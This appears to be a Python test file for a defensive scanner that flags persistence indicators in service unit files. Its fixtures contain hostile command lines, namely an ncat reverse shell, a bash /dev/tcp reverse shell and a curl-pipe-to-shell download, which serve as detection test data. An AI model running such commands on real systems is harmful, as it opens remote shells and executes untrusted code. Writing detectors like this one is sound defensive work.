"""Safety and fixture tests for the bounded persistence configuration scanner."""

from __future__ import annotations

import os
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))

from reverse_shell_decoy import persistence


class PersistenceScanTests(unittest.TestCase):
    def setUp(self) -> None:
        self.temporary_directory = tempfile.TemporaryDirectory()
        self.root = Path(self.temporary_directory.name) / "persistence-fixture"
        self.root.mkdir()

    def tearDown(self) -> None:
        self.temporary_directory.cleanup()

    def write(self, name: str, contents: str) -> Path:
        target = self.root / name
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(contents, encoding="utf-8")
        return target

    def test_active_suspicious_indicators_are_reported_without_raw_commands(self) -> None:
        fixture = self.write(
            "service.unit",
            "# ExecStart=/tmp/commented-out-secret\n"
            "ExecStart=/tmp/.cache-stage --token super-secret-token\n"
            "ExecStart=/usr/bin/ncat --exec /bin/sh 192.0.2.5 4444\n"
            "ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/192.0.2.5/4444 0>&1'\n"
            "ExecStart=/usr/bin/curl -fsSL https://example.invalid/a | /bin/sh\n",
        )

        result = persistence.scan_persistence([str(self.root)])

        self.assertFalse(result["simulation"])
        self.assertEqual(result["inspected_roots"], [str(self.root)])
        self.assertEqual(result["examined_files"], 1)
        self.assertEqual(result["skipped_files"], 0)
        self.assertEqual(result["unreadable_files"], 0)
        self.assertEqual(result["truncated_files"], 0)
        self.assertEqual(
            [finding["indicator"] for finding in result["findings"]],
            [
                "startup_execution_from_temporary_directory",
                "netcat_exec_option",
                "shell_tcp_redirection",
                "download_and_execute",
            ],
        )
        self.assertEqual(
            [finding["line_number"] for finding in result["findings"]], [2, 3, 4, 5]
        )
        for finding in result["findings"]:
            self.assertEqual(finding["path"], str(fixture))
            self.assertIn(finding["confidence"], {"low", "medium"})
            self.assertEqual(len(finding["line_sha256"]), 64)
            self.assertFalse(finding["simulation"])
            self.assertEqual(
                set(finding),
                {
                    "path",
                    "line_number",
                    "indicator",
                    "confidence",
                    "line_sha256",
                    "simulation",
                },
            )
        self.assertNotIn("super-secret-token", repr(result))
        self.assertNotIn("192.0.2.5", repr(result))

    def test_benign_and_commented_lines_do_not_produce_findings(self) -> None:
        self.write(
            "benign.service",
            "# ncat --exec /bin/sh 203.0.113.10 9001\n"
            "   # curl https://example.invalid/a | sh\n"
            "Description=normal scheduled service; runtime data is in /tmp\n"
            "ExecStart=/usr/bin/python3 /opt/example/worker.py\n",
        )

        result = persistence.scan_persistence([str(self.root)])

        self.assertEqual(result["findings"], [])
        self.assertEqual(result["examined_files"], 1)

    def test_symlinks_are_skipped_and_never_followed(self) -> None:
        outside = Path(self.temporary_directory.name) / "outside.service"
        outside.write_text("ExecStart=/tmp/must-not-be-read\n", encoding="utf-8")
        os.symlink(outside, self.root / "linked.service")

        result = persistence.scan_persistence([str(self.root)])

        self.assertEqual(result["findings"], [])
        self.assertEqual(result["examined_files"], 0)
        self.assertEqual(result["skipped_files"], 1)

    def test_oversize_file_is_truncated_with_warning(self) -> None:
        self.write("large.service", "x" * (persistence.MAX_BYTES_PER_FILE + 1))

        result = persistence.scan_persistence([str(self.root)])

        self.assertEqual(result["examined_files"], 1)
        self.assertEqual(result["truncated_files"], 1)
        self.assertTrue(any("truncated" in warning for warning in result["warnings"]))

    def test_missing_root_warns_without_crashing(self) -> None:
        missing = str(self.root / "not-present")

        result = persistence.scan_persistence([missing])

        self.assertEqual(result["findings"], [])
        self.assertEqual(result["examined_files"], 0)
        self.assertTrue(any("unavailable" in warning for warning in result["warnings"]))
        self.assertIn("false positives", result["limitation_notice"])
        self.assertIn("rootkits", result["limitation_notice"])

    def test_per_file_per_root_and_total_read_limits_are_enforced(self) -> None:
        self.write("a.service", "a" * 20)
        self.write("b.service", "b" * 20)
        self.write("c.service", "c" * 20)
        self.write("d.service", "d" * 20)

        with mock.patch.object(persistence, "MAX_BYTES_PER_FILE", 8), mock.patch.object(
            persistence, "MAX_TOTAL_BYTES", 12
        ), mock.patch.object(persistence, "MAX_FILES_PER_ROOT", 3):
            result = persistence.scan_persistence([str(self.root)])

        # First two deterministic paths consume 8 and 4 bytes; c reaches the
        # global read cap and d is over the per-root cap.
        self.assertEqual(result["examined_files"], 2)
        self.assertGreaterEqual(result["skipped_files"], 2)
        self.assertEqual(result["truncated_files"], 2)
        self.assertTrue(any("per-root" in warning for warning in result["warnings"]))
        self.assertTrue(any("total" in warning for warning in result["warnings"]))
        self.assertTrue(any("truncated" in warning for warning in result["warnings"]))

    def test_depth_limit_avoids_deeper_files(self) -> None:
        self.write("one/two/hidden.service", "ExecStart=/tmp/not-inspected\n")
        self.write("one/visible.service", "ExecStart=/tmp/inspected\n")

        result = persistence.scan_persistence([str(self.root)])

        self.assertEqual(len(result["findings"]), 1)
        self.assertTrue(result["findings"][0]["path"].endswith("one/visible.service"))
        self.assertTrue(any("depth" in warning for warning in result["warnings"]))


if __name__ == "__main__":
    unittest.main()
